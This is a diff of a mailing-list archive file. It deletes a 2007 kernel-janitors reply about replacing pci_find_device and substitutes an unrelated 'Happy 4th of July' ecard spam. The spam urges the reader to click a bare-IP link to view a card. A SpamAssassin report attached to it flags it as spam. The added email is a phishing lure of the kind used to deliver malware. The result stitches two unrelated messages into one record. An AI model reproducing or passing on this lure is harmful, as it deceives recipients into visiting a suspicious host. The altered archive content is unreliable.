@@ -1,31 +1,90 @@
-From: Matthew Wilcox <matthew@wil.cx>
-Date: Tue, 17 Jul 2007 01:30:18 +0000
-Subject: Re: [PATCH] change pci_find_device to pci_get_device,
-Message-Id: <20070717013018.GR13826@parisc-linux.org>
+From: "all-yours.net" <glq@kelsooil.com>
+Date: Wed, 04 Jul 2007 10:22:36 +0000
+Subject: [KJ] Happy 4th of July
+Message-Id: <001301c7be25$3dc9a100$ed3d706c@ke.vo>
+MIME-Version: 1
+Content-Type: multipart/mixed; boundary="----------=_1183544559-3969-7"
 List-Id: <kernel-janitors.vger.kernel.org>
-References: <11845693593123-git-send-email-crquan@gmail.com>
-In-Reply-To: <11845693593123-git-send-email-crquan@gmail.com>
-MIME-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
 To: kernel-janitors@vger.kernel.org
 
-On Mon, Jul 16, 2007 at 05:09:47PM -0700, Greg KH wrote:
-> Please read the comments for the pci_get_device() function to fully
-> understand why people have not just gone through and done a simple
-> search-and-replace action for the whole kernel tree.  It is much more
-> complex than that.
+This is a multi-part message in MIME format...
 
-Yes, it is.  Here's my solution:
+------------=_1183544559-3969-7
+Content-Type: text/plain; format=flowed; charset="Windows-1252";
+	reply-type=original
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
-http://marc.info/?l=linux-scsi&m8462846525015&w=2
-http://marc.info/?l=linux-scsi&m8462738926857&w=2
-http://marc.info/?l=linux-scsi&m8463215810772&w=2
-http://marc.info/?l=linux-scsi&m8462771422817&w=2
+Hi. Mate has sent you an ecard.
+See your card as often as you wish during the next 15 days.
 
-Untested, as I don't have the hardware.
+SEEING YOUR CARD
 
--- 
-"Bill, look, we understand that you're interested in selling us this
-operating system, but compare it to ours.  We can't possibly take such
-a retrograde step."
+If your email software creates links to Web pages, click on your 
+card's direct www address below while you are connected to the Internet:
+
+http://69.205.167.239/?69c2b1c85da463c5c036b0339eb3a60
+
+Or copy and paste it into your browser's "Location" box (where Internet 
+addresses go).
+     
+
+
+PRIVACY
+all-yours.net honors your privacy. Our home page and Card Pick Up have links to our 
+Privacy Policy.
+
+TERMS OF USE
+By accessing your card you agree we have no liability. 
+If you don't know the person sending the card or don't wish to see the card, 
+please disregard this Announcement.
+
+We hope you enjoy your awesome card.
+
+Wishing you the best,
+Administrator,
+all-yours.net
+
+
+------------=_1183544559-3969-7
+Content-Type: text/plain; name="SpamAssassinReport.txt"
+Content-Disposition: inline; filename="SpamAssassinReport.txt"
+Content-Transfer-Encoding: 7bit
+MIME-Version: 1.0
+X-Mailer: MIME-tools 5.419 (Entity 5.419)
+
+Spam detection software, running on the system "daredevil.linux-foundation.org", has
+identified this incoming email as possible spam.  The original message
+has been attached to this so you can view it (if it isn't spam) or label
+similar future email.  If you have any questions, see
+the administrator of that system for details.
+
+Content preview:  Hi. Mate has sent you an ecard. See your card as often
+  as you wish during the next 15 days. SEEING YOUR CARD If your email
+  software creates links to Web pages, click on your card's direct www
+  address below while you are connected to the Internet: [...] 
+
+Content analysis details:   (7.7 points, 5.0 required)
+
+ pts rule name              description
+---- ---------------------- --------------------------------------------------
+ 3.8 HELO_DYNAMIC_HCC       Relay HELO'd using suspicious hostname (HCC)
+ 3.8 HELO_DYNAMIC_IPADDR2   Relay HELO'd using suspicious hostname (IP addr
+                            2)
+ 0.2 NORMAL_HTTP_TO_IP      URI: Uses a dotted-decimal IP address in URL
+ 0.0 BAYES_50               BODY: Bayesian spam probability is 40 to 60%
+                            [score: 0.4976]
+
+
+
+------------=_1183544559-3969-7
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+Kernel-janitors mailing list
+Kernel-janitors@lists.linux-foundation.org
+https://lists.linux-foundation.org/mailman/listinfo/kernel-janitors
+------------=_1183544559-3969-7--
